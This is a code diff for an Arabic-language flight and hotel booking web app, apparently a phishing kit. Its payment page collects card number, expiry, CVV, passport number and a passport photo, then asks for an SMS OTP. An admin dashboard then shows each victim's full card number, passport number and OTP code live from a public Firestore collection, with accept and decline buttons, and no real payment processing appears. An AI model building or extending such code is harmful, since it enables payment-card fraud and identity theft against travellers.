+                                <button data-action="go-to-search" class="bg-[var(--booking-blue-light)] text-white font-bold py-3 px-8 rounded-lg text-lg transition hover:bg-[var(--booking-blue)]"><i class="fas fa-search mr-2"></i> ابحث عن حجز الآن</button>
+                            </div>`;
+            } else {
+                content = `<div class="space-y-4">${bookings.map(b => {
+                    let title, details, icon;
+                    if (b.type === 'flight') {
+                        icon = 'fa-plane-departure';
+                        title = `رحلة طيران: ${b.details.from_ar} إلى ${b.details.to_ar}`;
+                        details = `شركة الطيران: ${b.details.airline}`;
+                    } else {
+                        icon = 'fa-hotel';
+                        title = `إقامة: ${b.details.name}`;
+                        details = `الموقع: ${b.details.location_ar}`;
+                    }
+                    return `<a href="#" data-action="show-booking-details" data-booking-id="${b.id}" class="block bg-white p-4 rounded-lg shadow-md hover:shadow-lg transition-shadow">
+                                <div class="flex justify-between items-center">
+                                    <div>
+                                        <h4 class="font-bold text-lg flex items-center gap-3"><i class="fas ${icon} text-[var(--booking-blue-light)]"></i>${title}</h4>
+                                        <p class="text-slate-600 pr-8">${details}</p>
+                                    </div>
+                                    <div class="text-left">
+                                        <p class="font-bold text-lg text-green-600">$${b.price.toFixed(2)}</p>
+                                        <p class="text-xs text-slate-500">السعر المدفوع</p>
+                                    </div>
+                                </div>
+                            </a>`;
+                }).join('')}</div>`;
+            }
+            return `<div class="p-4"><header class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold">حجوزاتي</h2><button class="back-btn text-3xl text-slate-400">&times;</button></header>${content}</div>`;
+        };
+
+        const accountDetailsPageHTML = (name, email) => `<div class="p-4"><header class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold">حسابي</h2><button class="back-btn text-3xl text-slate-400">&times;</button></header><div class="bg-white rounded-lg p-6 shadow-md space-y-4"><div><h3 class="font-bold">الاسم</h3><p class="text-slate-600">${name}</p></div><hr><div><h3 class="font-bold">البريد الإلكتروني</h3><p class="text-slate-600">${email}</p></div><hr><button data-action="logout" class="w-full bg-red-100 text-red-700 font-bold py-3 rounded-lg hover:bg-red-200 transition">تسجيل الخروج</button></div></div>`;
+        
+        const bookingDetailsPageHTML = (booking) => {
+            let title;
+            if (booking.type === 'flight') {
+                title = `رحلة طيران: ${booking.details.from_ar} إلى ${booking.details.to_ar}`;
+            } else {
+                title = `إقامة: ${booking.details.name}`;
+            }
+            return `<div class="p-4"><header class="flex items-center gap-4 mb-8"><button class="back-btn text-2xl" data-target="dashboard"><i class="fas fa-arrow-right"></i></button><h2 class="text-2xl font-bold">تفاصيل الحجز</h2></header><div class="bg-white rounded-lg p-6 shadow-md space-y-4"><div><h3 class="font-bold text-lg">${title}</h3></div><hr><div><h3 class="font-bold">اسم المسافر</h3><p class="text-slate-600">${booking.passengerName}</p></div><hr><div><h3 class="font-bold">حالة الحجز</h3><p class="text-slate-600 text-green-600 font-bold">مؤكد</p></div></div></div>`;
+        };
+        
+        const favoritesPageHTML = () => {
+            let content;
+            const favoriteItems = [...liveData.flights, ...liveData.stays].filter(item => userState.favorites.includes(item.id));
+            if (favoriteItems.length === 0) {
+                content = `<div class="text-center bg-white rounded-lg p-10 shadow-md"><i class="far fa-heart text-6xl text-slate-300 mb-4"></i><h3 class="text-xl font-bold mb-2">قائمة المحفوظات فارغة</h3><p class="text-slate-500">اضغط على أيقونة القلب لحفظ أماكن الإقامة والرحلات التي تعجبك.</p></div>`;
+            } else {
+                content = `<div class="space-y-4">${favoriteItems.map(item => {
+                    const isFavorited = userState.favorites.includes(item.id);
+                    let price, title, subtitle, type;
+                    if (item.type === 'flights') {
+                        type = 'flights';
+                        price = item.pricing.base_price_adult;
+                        title = `${item.from_ar} <i class="fas fa-arrow-left mx-2"></i> ${item.to_ar}`;
+                        subtitle = item.airline;
+                    } else { // stay
+                        type = 'stays';
+                        price = item.pricing.base_rate_2_adults;
+                        title = item.name;
+                        subtitle = item.location_ar;
+                    }
+                    return `<div class="bg-white p-4 rounded-lg shadow-md flex items-center justify-between gap-4">
+                                <div>
+                                    <h4 class="font-bold text-lg">${title}</h4>
+                                    <p class="text-slate-600 text-sm">${subtitle}</p>
+                                </div>
+                                <div class="text-left flex items-center gap-4">
+                                    <p class="font-bold text-xl">$${price.toFixed(2)}</p>
+                                    <button class="favorite-btn text-2xl text-slate-300 ${isFavorited ? 'favorited' : ''}" data-action="toggle-favorite" data-item-id="${item.id}" data-item-type="${type}"><i class="far fa-heart"></i></button>
+                                </div>
+                            </div>`;
+                }).join('')}</div>`;
+            }
+            return `<div class="p-4"><header class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold">المحفوظات</h2><button class="back-btn text-3xl text-slate-400">&times;</button></header>${content}</div>`;
+        };
+
+        const passportPageHTML = `<div class="p-4"><header class="flex items-center gap-4 mb-8"><button class="back-btn text-2xl" data-target="searchResults"><i class="fas fa-arrow-right"></i></button><h2 class="text-2xl font-bold">معلومات المسافر</h2></header><form id="passportForm" class="bg-white p-6 rounded-lg shadow-md space-y-6" novalidate><div><label class="font-bold block mb-2">الاسم الكامل (مطابق للجواز)</label><input type="text" name="fullName" required class="w-full border-2 p-3 rounded-lg" placeholder="مثال: سيف الدين محمد"></div><div><label class="font-bold block mb-2">رقم جواز السفر</label><input type="text" name="passportNumber" required class="w-full border-2 p-3 rounded-lg" placeholder="مثال: A12345678"></div><div><label class="font-bold block mb-2">صورة جواز السفر</label><div id="passport-image-dropzone" class="relative mt-2 h-48 rounded-lg border border-dashed border-slate-900/25 cursor-pointer transition-colors"><div id="passport-image-prompt" class="absolute inset-0 flex flex-col justify-center items-center px-6 py-10 text-center"><i class="fas fa-passport text-5xl text-slate-300"></i><div class="mt-4 flex text-sm justify-center"><label for="passportImageInput" class="relative cursor-pointer font-semibold text-blue-600"><span>قم بالتحميل</span><input id="passportImageInput" name="passportImage" type="file" class="sr-only" accept="image/*" required></label><p class="pr-1">أو اسحب وأفلت الملف</p></div><p class="text-xs text-slate-500">PNG, JPG up to 10MB</p></div><img id="passport-image-preview" src="#" class="hidden h-full w-full object-cover rounded-lg" alt="Passport Preview"></div></div><button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white font-bold text-lg py-3 rounded-lg">تأكيد والانتقال للدفع</button></form></div>`;
+        
+        const paymentPageHTML = () => `<div class="p-4"><header class="flex items-center gap-4 mb-8"><button class="back-btn text-2xl" data-target="passport"><i class="fas fa-arrow-right"></i></button><h2 class="text-2xl font-bold">الدفع الآمن</h2></header><form id="paymentForm" class="bg-white p-6 rounded-lg shadow-md space-y-6" novalidate><div class="flex items-center gap-4"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" class="h-8" alt="Mastercard"><img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-10" alt="Visa"></div><div class="relative"><div><label class="font-bold block mb-2">رقم البطاقة</label><input type="text" id="cardNumberInput" name="cardNumber" required class="w-full border-2 p-3 rounded-lg pl-12" placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19"><i id="card-icon" class="fas fa-credit-card absolute top-10 left-4 text-2xl text-slate-300"></i></div></div><div class="grid grid-cols-2 gap-4"><div><label class="font-bold block mb-2">تاريخ الانتهاء</label><input type="text" id="expiryInput" name="expiry" required class="w-full border-2 p-3 rounded-lg" placeholder="MM / YY" inputmode="numeric"></div><div><label class="font-bold block mb-2">CVV</label><input type="text" id="cvvInput" name="cvv" required class="w-full border-2 p-3 rounded-lg" placeholder="•••" inputmode="numeric" maxlength="4"></div></div><div id="email-status" class="text-center font-bold"></div><button type="submit" class="w-full bg-[var(--booking-green)] text-white font-black text-xl py-4 rounded-lg tracking-wider" style="font-family: 'Cairo', sans-serif;">ادفع الآن ($${bookingState.calculatedPrice ? bookingState.calculatedPrice.toFixed(2) : '0.00'})</button></form></div>`;
+        
+        const otpModalHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><h3 class="text-2xl font-bold mb-4">التحقق من الدفع</h3><p id="otp-message" class="text-slate-600 mb-6">أدخل رمز التحقق (OTP) المرسل إلى جوالك.</p><form id="otpForm"><div class="otp-inputs mb-6"><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" required><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric"><input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric"></div><p id="otpError" class="text-red-500 text-sm font-bold hidden text-center mb-4">الرمز الذي أدخلته غير صحيح.</p><button type="submit" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-3 rounded-lg">تحقق</button></form></div>`;
+        const passengerModalHTML = `<div class="modal-content bg-white p-6 rounded-lg shadow-xl w-full max-w-sm space-y-4"><h3 class="text-xl font-bold">الركاب</h3><div class="flex justify-between items-center"><div><p class="font-semibold">بالغون</p><p class="text-sm text-slate-500">فوق 12 سنة</p></div><div class="flex items-center gap-4"><button data-type="adults" class="op-btn minus w-8 h-8 bg-slate-200 rounded-full font-bold">-</button><span class="op-count" data-type="adults">1</span><button data-type="adults" class="op-btn plus w-8 h-8 bg-slate-200 rounded-full font-bold">+</button></div></div><div class="flex justify-between items-center"><div><p class="font-semibold">أطفال</p><p class="text-sm text-slate-500">2 - 12 سنة</p></div><div class="flex items-center gap-4"><button data-type="children" class="op-btn minus w-8 h-8 bg-slate-200 rounded-full font-bold">-</button><span class="op-count" data-type="children">0</span><button data-type="children" class="op-btn plus w-8 h-8 bg-slate-200 rounded-full font-bold">+</button></div></div><button class="confirm-op-btn w-full bg-[var(--booking-blue-light)] text-white font-bold py-3 rounded-lg">تأكيد</button></div>`;
+        const guestModalHTML = `<div class="modal-content bg-white p-6 rounded-lg shadow-xl w-full max-w-sm space-y-4"><h3 class="text-xl font-bold">الغرف والضيوف</h3><div class="flex justify-between items-center"><div><p class="font-semibold">غرف</p></div><div class="flex items-center gap-4"><button data-type="rooms" class="op-btn minus w-8 h-8 bg-slate-200 rounded-full font-bold">-</button><span class="op-count" data-type="rooms">1</span><button data-type="rooms" class="op-btn plus w-8 h-8 bg-slate-200 rounded-full font-bold">+</button></div></div><div class="flex justify-between items-center"><div><p class="font-semibold">بالغون</p></div><div class="flex items-center gap-4"><button data-type="adults" class="op-btn minus w-8 h-8 bg-slate-200 rounded-full font-bold">-</button><span class="op-count" data-type="adults">2</span><button data-type="adults" class="op-btn plus w-8 h-8 bg-slate-200 rounded-full font-bold">+</button></div></div><div class="flex justify-between items-center"><div><p class="font-semibold">أطفال</p></div><div class="flex items-center gap-4"><button data-type="children" class="op-btn minus w-8 h-8 bg-slate-200 rounded-full font-bold">-</button><span class="op-count" data-type="children">0</span><button data-type="children" class="op-btn plus w-8 h-8 bg-slate-200 rounded-full font-bold">+</button></div></div><button class="confirm-op-btn w-full bg-[var(--booking-blue-light)] text-white font-bold py-3 rounded-lg">تأكيد</button></div>`;
+        const countryCodeModalHTML = `<div class="modal-content bg-white w-full max-w-sm rounded-xl shadow-xl"><header class="p-4 border-b flex justify-between items-center"><h3 class="text-lg font-bold">اختر الدولة</h3><button class="close-modal-btn text-2xl">&times;</button></header><div class="p-2 max-h-[60vh] overflow-y-auto">${countryData.sort((a, b) => a.name.localeCompare(b.name)).map(c => `<div class="country-item flex items-center justify-between p-3 hover:bg-slate-100 rounded-lg cursor-pointer" data-code="${c.code}" data-flag="${c.flag}"><span class="font-semibold">${c.name}</span><div class="flex items-center gap-2 text-slate-500"><span>${c.code}</span><img src="https://flagcdn.com/w20/${c.flag}.png" alt="${c.name} Flag"/></div></div>`).join('')}</div></div>`;
+        const adminLoginPageHTML = `<div class="w-full max-w-sm mx-auto p-4 text-center"><div class="flex justify-between items-center mb-8"><span class="w-8"></span><i class="fas fa-user-shield text-4xl text-slate-300"></i><button class="back-btn text-3xl text-slate-400">&times;</button></div><h2 class="text-2xl font-bold mb-2">لوحة تحكم المشرف</h2><p class="text-slate-500 mb-8">الرجاء تسجيل الدخول للمتابعة.</p><form id="adminLoginForm" class="space-y-4 text-right"><div><label class="font-bold block mb-2">اسم المستخدم</label><input type="text" name="username" required class="w-full border-2 rounded-lg p-3 text-lg text-right"></div><div><label class="font-bold block mb-2">كلمة المرور</label><div class="relative"><input type="password" name="password" required class="w-full border-2 rounded-lg p-3 text-lg pr-12"><i class="fas fa-eye-slash password-toggle-icon absolute top-1/2 right-4 -translate-y-1/2 text-slate-400 cursor-pointer"></i></div></div><p id="adminLoginError" class="text-red-500 text-sm font-bold hidden text-center">اسم المستخدم أو كلمة المرور غير صحيحة.</p><button type="submit" class="w-full bg-[var(--booking-blue)] text-white font-bold py-4 rounded-lg text-lg">دخول</button></form></div>`;
+        const loadingModalHTML = (message) => `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><div class="flex justify-center items-center gap-4"><i class="fas fa-spinner fa-spin text-4xl text-[var(--booking-blue-light)]"></i><h3 class="text-xl font-bold">${message}</h3></div></div>`;
+        
+        const searchResultsPageHTML = (results, type, searchParams) => {
+            const searchWidgetHTML = type === 'flights' ? flightsFormHTML(searchParams) : staysFormHTML(searchParams);
+            const noResultsHTML = `<div class="text-center p-10 bg-white rounded-lg shadow-md"><i class="fas fa-search-minus text-6xl text-slate-300 mb-4"></i><h3 class="text-xl font-bold mb-2">لا توجد نتائج مطابقة</h3><p class="text-slate-500">حاول تغيير معايير البحث الخاصة بك.</p></div>`;
+            
+            const resultsHTML = results.length === 0 ? noResultsHTML : results.map(item => {
+                const isFavorited = userState.favorites.includes(item.id);
+                let finalPrice = 0;
+
+                if (type === 'flights') {
+                    const season = getSeason(searchParams.departureDate || new Date());
+                    const baseAdultPrice = parseFloat(item.pricing.base_price_adult) || 0;
+                    const baseChildPrice = parseFloat(item.pricing.base_price_child) || 0;
+                    const seasonMultiplier = parseFloat(item.pricing.seasons[season]) || 1;
+                    const currentDiscount = parseFloat(item.discount) || 0;
+                    const numAdults = parseInt(searchParams.adults) || 0;
+                    const numChildren = parseInt(searchParams.children) || 0;
+                    finalPrice = (baseAdultPrice * numAdults + baseChildPrice * numChildren) * seasonMultiplier * (1 - currentDiscount);
+                    
+                    return `<div class="bg-white p-4 rounded-lg shadow-sm flex flex-col sm:flex-row gap-4 justify-between items-center">
+                                <div class="flex-grow">
+                                    <div class="flex items-center gap-4 mb-2">
+                                        <img src="https://ui-avatars.com/api/?name=${item.airline.split(' ').join('+')}&background=random&size=48" class="rounded-full" alt="${item.airline}">
+                                        <div>
+                                            <h4 class="font-bold text-lg">${item.from_ar} <i class="fas fa-long-arrow-alt-left mx-2 text-slate-400"></i> ${item.to_ar}</h4>
+                                            <p class="text-slate-600 text-sm">${item.airline}</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="text-center sm:text-left border-t sm:border-t-0 sm:border-r w-full sm:w-auto pt-4 sm:pt-0 sm:pr-4">
+                                    ${item.discount > 0 ? `<p class="text-sm text-red-500 font-bold">خصم ${item.discount * 100}%</p>` : ''}
+                                    <p class="font-extrabold text-2xl text-[var(--booking-blue)]">$${finalPrice.toFixed(2)}</p>
+                                    <p class="text-xs text-slate-500">السعر الإجمالي للرحلة</p>
+                                </div>
+                                <div class="flex flex-col gap-2 w-full sm:w-auto">
+                                    <button data-action="initiate-booking" data-item-id="${item.id}" data-item-type="flights" data-price="${finalPrice}" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-2 px-6 rounded-lg">احجز الآن</button>
+                                    <button data-action="toggle-favorite" class="favorite-btn text-2xl text-slate-300 hover:text-[var(--booking-red)] transition ${isFavorited ? 'favorited' : ''}" data-item-id="${item.id}" data-item-type="flights"><i class="far fa-heart"></i></button>
+                                </div>
+                            </div>`;
+                } 
+                
+                if (type === 'stays') {
+                    const season = getSeason(searchParams.checkinDate || new Date());
+                    const nights = (searchParams.checkoutDate && searchParams.checkinDate) ? Math.max(1, Math.ceil((searchParams.checkoutDate - searchParams.checkinDate) / (1000 * 60 * 60 * 24))) : 1;
+                    const baseRate = parseFloat(item.pricing.base_rate_2_adults) || 0;
+                    const extraAdultRate = parseFloat(item.pricing.extra_adult_rate) || 0;
+                    const childRate = parseFloat(item.pricing.child_rate) || 0;
+                    const seasonMultiplier = parseFloat(item.pricing.seasons[season]) || 1;
+                    const currentDiscount = parseFloat(item.discount) || 0;
+                    const numAdults = parseInt(searchParams.adults) || 0;
+                    const numChildren = parseInt(searchParams.children) || 0;
+                    
+                    const extraAdults = Math.max(0, numAdults - 2);
+                    const pricePerNight = baseRate + (extraAdultRate * extraAdults) + (childRate * numChildren);
+                    
+                    finalPrice = pricePerNight * nights * seasonMultiplier * (1 - currentDiscount);
+
+                    return `<div class="bg-white p-4 rounded-lg shadow-sm flex flex-col sm:flex-row gap-4 justify-between items-center">
+                                <div class="flex-grow">
+                                     <h4 class="font-bold text-lg">${item.name}</h4>
+                                     <p class="text-slate-600 text-sm mb-1">${item.location_ar}</p>
+                                     <div class="flex items-center gap-1 text-[var(--booking-yellow)]">${Array(item.rating).fill(0).map(() => '<i class="fas fa-star"></i>').join('')}</div>
+                                </div>
+                                <div class="text-center sm:text-left border-t sm:border-t-0 sm:border-r w-full sm:w-auto pt-4 sm:pt-0 sm:pr-4">
+                                    ${item.discount > 0 ? `<p class="text-sm text-red-500 font-bold">خصم ${item.discount * 100}%</p>` : ''}
+                                    <p class="font-extrabold text-2xl text-[var(--booking-blue)]">$${finalPrice.toFixed(2)}</p>
+                                    <p class="text-xs text-slate-500">للإقامة الكاملة (${nights} ${nights > 1 ? 'ليال' : 'ليلة'})</p>
+                                </div>
+                                 <div class="flex flex-col gap-2 w-full sm:w-auto">
+                                    <button data-action="initiate-booking" data-item-id="${item.id}" data-item-type="stays" data-price="${finalPrice}" class="w-full bg-[var(--booking-blue-light)] text-white font-bold py-2 px-6 rounded-lg">احجز الآن</button>
+                                    <button data-action="toggle-favorite" class="favorite-btn text-2xl text-slate-300 hover:text-[var(--booking-red)] transition ${isFavorited ? 'favorited' : ''}" data-item-id="${item.id}" data-item-type="stays"><i class="far fa-heart"></i></button>
+                                </div>
+                            </div>`;
+                }
+            }).join('');
+
+            return `<div class="p-4 space-y-6">
+                <header class="flex justify-between items-center">
+                    <h2 class="text-3xl font-extrabold">نتائج البحث</h2>
+                    <button class="back-btn text-3xl text-slate-400">&times;</button>
+                </header>
+                <div class="bg-white p-4 rounded-lg shadow-md">${searchWidgetHTML}</div>
+                <div class="space-y-4">${resultsHTML}</div>
+            </div>`;
+        };
+
+        const adminDashboardPageHTML = () => {
+            return `<div class="p-4">
+                <header class="flex justify-between items-center mb-8">
+                    <h2 class="text-3xl font-extrabold">لوحة تحكم المشرف</h2>
+                    <button class="back-btn text-3xl text-slate-400">&times;</button>
+                </header>
+                <div class="grid lg:grid-cols-2 gap-8">
+                        <div class="bg-white p-6 rounded-lg shadow-md lg:col-span-2">
+                            <h3 class="text-2xl font-bold mb-4 flex items-center gap-2"><i class="fas fa-hourglass-half text-[var(--booking-blue)]"></i>طلبات الحجز المعلقة</h3>
+                            <div id="pending-requests-container" class="space-y-4 max-h-[60vh] overflow-y-auto">
+                               <p class="text-slate-500 text-center p-4">لا توجد طلبات معلقة حالياً.</p>
+                            </div>
+                        </div>
+                    <div class="bg-white p-6 rounded-lg shadow-md">
+                        <h3 class="text-2xl font-bold mb-4 flex items-center gap-2"><i class="fas fa-tags text-[var(--booking-blue)]"></i>الخصومات العامة</h3>
+                        <div class="space-y-6">
+                            <form id="flightDiscountForm" class="space-y-3 p-4 border rounded-lg">
+                                <label class="font-bold text-lg">خصومات الرحلات</label>
+                                <p class="text-slate-600 text-sm">اختر نسبة الخصم لتطبيقها على السعر الأساسي لجميع الرحلات.</p>
+                                <div class="flex flex-wrap gap-x-6 gap-y-2">
+                                    ${[0, 20, 30, 40, 50, 60].map(d => `
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="radio" name="discount" value="${d/100}" class="form-radio h-5 w-5 text-[var(--booking-blue-light)]" ${d===0 ? 'checked' : ''}>
+                                        <span class="font-semibold">${d === 0 ? 'بدون خصم' : `${d}%`}</span>
+                                    </label>`).join('')}
+                                </div>
+                                <button type="submit" class="w-full mt-4 bg-[var(--booking-blue-light)] text-white font-bold py-3 rounded-lg hover:bg-[var(--booking-blue)] transition">تطبيق على كل الرحلات</button>
+                            </form>
+                            <form id="stayDiscountForm" class="space-y-3 p-4 border rounded-lg">
+                                <label class="font-bold text-lg">خصومات الإقامة</label>
+                                <p class="text-slate-600 text-sm">اختر نسبة الخصم لتطبيقها على السعر الأساسي لجميع أماكن الإقامة.</p>
+                                <div class="flex flex-wrap gap-x-6 gap-y-2">
+                                    ${[0, 20, 30, 40, 50, 60].map(d => `
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="radio" name="discount" value="${d/100}" class="form-radio h-5 w-5 text-[var(--booking-blue-light)]" ${d===0 ? 'checked' : ''}>
+                                        <span class="font-semibold">${d === 0 ? 'بدون خصم' : `${d}%`}</span>
+                                    </label>`).join('')}
+                                </div>
+                                <button type="submit" class="w-full mt-4 bg-[var(--booking-blue-light)] text-white font-bold py-3 rounded-lg hover:bg-[var(--booking-blue)] transition">تطبيق على كل الإقامات</button>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="bg-white p-6 rounded-lg shadow-md">
+                        <h3 class="text-2xl font-bold mb-4 flex items-center gap-2"><i class="fas fa-tag text-[var(--booking-blue)]"></i>خصم مخصص</h3>
+                        <form id="adminSearchForm" class="space-y-3">
+                            <div class="flex gap-2">
+                                <select name="type" class="border-2 rounded-lg p-3">
+                                    <option value="flights">رحلات</option>
+                                    <option value="stays">إقامة</option>
+                                </select>
+                                <input type="search" name="query" placeholder="ابحث بالاسم أو الوجهة..." class="w-full border-2 rounded-lg p-3">
+                            </div>
+                        </form>
+                        <div id="admin-search-results" class="mt-4 space-y-3 max-h-96 overflow-y-auto"></div>
+                    </div>
+                </div>
+            </div>`;
+        };
+        
+        // --- Page/Modal/Notification Management ---
+        function showPage(pageName) { Object.values(pages).forEach(p => p.classList.remove('active')); if(pages[pageName]) pages[pageName].classList.add('active'); }
+        function showModal(modalName, message = '') { 
+            if(modals[modalName]) {
+                if(modalName === 'loading') {
+                    modals.loading.innerHTML = loadingModalHTML(message);
+                }
+                modals[modalName].classList.add('active'); 
+            }
+        }
+        function hideModals() { Object.values(modals).forEach(m => m.classList.remove('active')); }
+        
+        function addNotification(title, message, actions, target = 'user') {
+            const targetState = target === 'admin' ? adminState.notifications : userState.notifications;
+            targetState.lastId++;
+            targetState.unreadCount++;
+            targetState.items.unshift({ id: targetState.lastId, title, message, actions, read: false });
+            
+            if (target === 'user') {
+                renderNotifications();
+            }
+        }
+
+        function renderNotifications() {
+            const popup = popups.notifications;
+            const notificationData = userState.notifications;
+            let content = `<div class="p-3 border-b flex justify-between items-center"><h3 class="font-bold">الإشعارات</h3><button class="close-popup-btn text-xl text-slate-500 hover:text-slate-800">&times;</button></div>`;
+            if (notificationData.items.length === 0) {
+                content += `<div class="p-4 text-center text-slate-500">لا توجد إشعارات جديدة.</div>`;
+            } else {
+                content += `<div class="max-h-80 overflow-y-auto">${notificationData.items.map(item => `<div class="p-3 border-b hover:bg-slate-50 ${item.read ? 'opacity-60' : ''}"><h4 class="font-bold">${item.title}</h4><p class="text-sm text-slate-600">${item.message}</p>${item.actions ? `<div class="mt-2">${item.actions}</div>` : ''}</div>`).join('')}</div>`;
+            }
+            popup.innerHTML = content;
+            document.getElementById('notification-dot').classList.toggle('hidden', notificationData.unreadCount === 0);
+        }
+        
+        // --- Main Logic & Event Handlers ---
+        function navigateToUserArea(targetPage = 'dashboard') {
+            if (userState.loggedIn) {
+                if (targetPage === 'accountDetails') {
+                    pages.accountDetails.innerHTML = accountDetailsPageHTML(userState.name, userState.email);
+                } else if (targetPage === 'favorites') {
+                    pages.favorites.innerHTML = favoritesPageHTML();
+                }
+                else {
+                    pages.dashboard.innerHTML = dashboardPageHTML(userState.name, userState.bookings);
+                }
+                showPage(targetPage);
+            } else {
+                showPage('signIn');
+            }
+        }
+
+        async function finalizeBooking() {
+            // Unsubscribe from the listener as the process is complete
+            if (unsubscribeFromPendingBooking) {
+                unsubscribeFromPendingBooking();
+                unsubscribeFromPendingBooking = null;
+            }
+
+            userState.bookings.push({
+                id: bookingState.pendingBookingId, // Use the ID from the confirmed booking
+                type: bookingState.selectedItem.type,
+                details: bookingState.selectedItem,
+                price: bookingState.calculatedPrice,
+                passengerName: bookingState.fullName
+            });
+
+            modals.result.innerHTML = `<div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"><i class="fas fa-check-circle text-7xl text-[var(--booking-green)] mb-4"></i><h3 class="text-2xl font-bold mb-2">تم تأكيد الحجز!</h3><p class="text-slate-600 mb-6">شكرًا لك. تم إضافة الحجز إلى قائمة حجوزاتك.</p><button class="close-modal-btn w-full bg-slate-200 text-slate-800 font-bold py-3 rounded-lg" data-action="go-to-dashboard">حسناً</button></div>`;
+            showModal('result');
+
+            addNotification(
+                'حجز مؤكد!', 
+                `لقد أكملت حجزك بنجاح يا ${userState.name}.`,
+                `<button class="text-sm font-bold text-white bg-[var(--booking-blue-light)] py-1 px-3 rounded-md" data-action="go-to-dashboard">عرض الحجوزات</button>`
+            );
+
+            // Clean up the confirmed booking from the pending list
+            const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, bookingState.pendingBookingId);
+            try {
+                await deleteDoc(docRef);
+            } catch (e) {
+                console.error("Could not delete pending doc:", e);
+            }
+            
+            bookingState.pendingBookingId = null;
+        }
+        
+        function renderOffers() {
+            const offersSlider = document.getElementById('offers-slider');
+            if (!offersSlider || liveData.stays.length === 0) {
+                 offersSlider.innerHTML = `<p class="text-slate-500 p-4">لا توجد عروض متاحة حالياً.</p>`;
+                 return;
+            }
+
+            const randomStays = [...liveData.stays].sort(() => 0.5 - Math.random()).slice(0, 8); // Limit to 8 offers
+
+            offersSlider.innerHTML = randomStays.map(stay => `
+                <div data-action="search-offer" data-destination="${stay.location_ar}" class="snap-start flex-shrink-0 w-80 bg-cover bg-center rounded-lg text-white p-4 flex flex-col justify-end h-48 cursor-pointer group" style="background-image: linear-gradient(to top, rgba(0,0,0,0.8), transparent), url(${stay.image_url || `https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=800`});">
+                    <div class="transition-transform duration-300 group-hover:scale-110">
+                        <h3 class="font-bold">${stay.name}</h3>
+                        <p>${stay.location_ar}</p>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // --- Function to start the admin listener ---
+        function startAdminBookingListener() {
+            if (unsubscribeFromAdminBookings) {
+                console.log("Admin listener already active.");
+                return; // Don't attach multiple listeners
+            }
+            console.log("Starting admin booking listener...");
+            const pendingCollectionRef = collection(db, `artifacts/${appId}/public/data/pending_bookings`);
+            unsubscribeFromAdminBookings = onSnapshot(query(pendingCollectionRef), (snapshot) => {
+                const requests = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                console.log("Admin listener received updates:", requests);
+                renderPendingRequests(requests);
+            });
+        }
+
+        function renderPendingRequests(requests) {
+            const container = document.getElementById('pending-requests-container');
+            if (!container) return;
+
+            if (requests.length === 0) {
+                container.innerHTML = `<p class="text-slate-500 text-center p-4">لا توجد طلبات معلقة حالياً.</p>`;
+                return;
+            }
+
+            container.innerHTML = requests.map(req => {
+                // Defensive Check: Ensure the core data structure exists before trying to render.
+                if (!req.bookingDetails || !req.bookingDetails.selectedItem) {
+                    console.error("Skipping malformed pending request from Firestore. Document ID:", req.id, "Data:", req);
+                    // Return a safe placeholder UI for the broken item instead of crashing.
+                    return `
+                    <div class="bg-red-50 p-4 rounded-lg border border-red-200">
+                        <p class="font-bold text-red-700">طلب تالف (ID: ${req.id})</p>
+                        <p class="text-sm text-red-600">فشل عرض هذا الطلب. تحقق من بياناته في Firestore أو من خلال الكونسول.</p>
+                    </div>`;
+                }
+
+                // If the check passes, we can safely access the data.
+                const item = req.bookingDetails.selectedItem;
+                const title = item.type === 'flights' ? `${item.from_ar} إلى ${item.to_ar}` : item.name;
+                const statusText = {
+                    payment_pending: 'في انتظار تأكيد الدفع',
+                    otp_submitted: 'في انتظار تأكيد الرمز',
+                }[req.status] || req.status; // Fallback to raw status if unknown
+                
+                return `
+                <div class="bg-slate-50 p-4 rounded-lg border transition-opacity duration-300" id="request-${req.id}">
+                    <div class="flex justify-between items-center mb-3">
+                        <div>
+                            <p class="font-bold">${title}</p>
+                            <p class="text-sm text-slate-600">${req.bookingDetails.fullName || 'N/A'} (${req.userEmail || 'N/A'})</p>
+                        </div>
+                        <p class="font-bold text-lg text-[var(--booking-blue)]">$${req.bookingDetails.calculatedPrice ? req.bookingDetails.calculatedPrice.toFixed(2) : '0.00'}</p>
+                    </div>
+                    <div class="bg-white p-2 rounded text-sm space-y-1">
+                        <p><strong>البطاقة:</strong> ${req.bookingDetails.cardNumber || 'N/A'}</p>
+                        <p><strong>الجواز:</strong> ${req.bookingDetails.passportNumber || 'N/A'}</p>
+                        ${req.otpCode ? `<p class="font-bold text-red-600"><strong>رمز التحقق:</strong> ${req.otpCode}</p>` : ''}
+                    </div>
+                    <div class="mt-3 flex justify-between items-center">
+                        <p class="text-sm font-bold text-yellow-600">${statusText}</p>
+                        <div class="flex gap-2">
+                             <button data-action="admin-decline" data-doc-id="${req.id}" class="bg-red-600 text-white font-bold py-1 px-4 rounded-md text-sm">رفض</button>
+                             <button data-action="admin-accept" data-doc-id="${req.id}" class="bg-green-600 text-white font-bold py-1 px-4 rounded-md text-sm">قبول</button>
